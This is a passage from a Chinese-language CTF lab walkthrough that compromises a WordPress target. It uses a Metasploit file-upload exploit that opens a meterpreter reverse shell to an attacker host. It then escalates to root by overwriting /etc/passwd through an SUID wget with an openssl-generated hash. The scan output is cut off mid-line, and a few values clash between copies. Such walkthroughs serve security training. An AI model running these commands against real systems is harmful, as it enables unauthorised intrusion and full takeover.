 | Readme: http://192.168.32.149/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | [!] The version is out of date, the latest version is 9.1.2
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.32.149/wordpress/wp-content/plugins/wp-support-plus-responsive-ticket-system/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WP Support Plus Responsive Ticket System  use exploit/unix/webapp/wp_reflexgallery_file_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set rhosts 192.168.32.149
rhosts => 192.168.32.149
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > set targeturi /wordpress
targeturi => /wordpress
msf6 exploit(unix/webapp/wp_reflexgallery_file_upload) > exploit
[*] Started reverse TCP handler on 192.168.32.130:4444 
[+] Our payload is at: WIfhFLFPqz.php. Calling payload...
[*] Calling payload...
[*] Sending stage (39282 bytes) to 192.168.32.149
[*] Meterpreter session 1 opened (192.168.32.130:4444 -> 192.168.32.149:46952) at 2022-06-06 21:36:43 -0400
[+] Deleted WIfhFLFPqz.php
meterpreter > shell
Process 12488 created.
Channel 2 created.
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2022/06$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**权限提升**
一旦我们获得了适当的外壳，我们就枚举了机器的标志。我们在 /home/raj/ 目录下找到 flag1.txt
```
cd /home 
ls 
cd raj 
ls 
cat flag1.txt
aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu
```
现在对于权限提升，常规做法是在"查找"命令的帮助下检查任何具有 SUID 权限的文件。我们使用以下命令枚举所有具有 SUID 权限的二进制文件：
```
find / -perm -u=s -type f 2>/dev/null
```
![image-20220607094251815](../../.gitbook/assets/image-20220607094251815.png)
查找命令显示**wget**和**cp**命令具有 SUID 权限。这对于升级 root 权限是可能的
SUID Binaries 命令为我们提供了所有可以读/写的敏感文件，因此在 wget 命令的帮助下，我们可以覆盖 `/etc/passwd`。  
现在我们正在为我们的新用户创建密码的盐值，这将通过使用"openssl"以下命令来完成，如下面的屏幕截图所示：
```
┌──(root💀kali)-[~/Desktop]
└─# openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```
我们将得到类似这样的哈希值：**"$1$ignite$3eTbJm980Hz.k1NTdNxe1"**；这将帮助我们在目标机器的 `/etc/passwd` 文件中创建用户条目。现在我们已经在本地机器上复制了 `/etc/passwd` 文件的全部内容，如下图所示。
![image-20220607095653449](../../.gitbook/assets/image-20220607095653449.png)
粘贴上面复制的内容后，我们将为用户"**ignite**"编辑一条新记录，然后将上面复制的哈希密码粘贴到记录中，如下所示。
```
iqnite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```
![image-20220607100427511](../../.gitbook/assets/image-20220607100427511.png)
下载passwd文件覆盖靶场的passwd文件
![image-20220607100034685](../../.gitbook/assets/image-20220607100034685.png)
提权成功
![image-20230208145757431](../../.gitbook/assets/image-20230208145757431.png)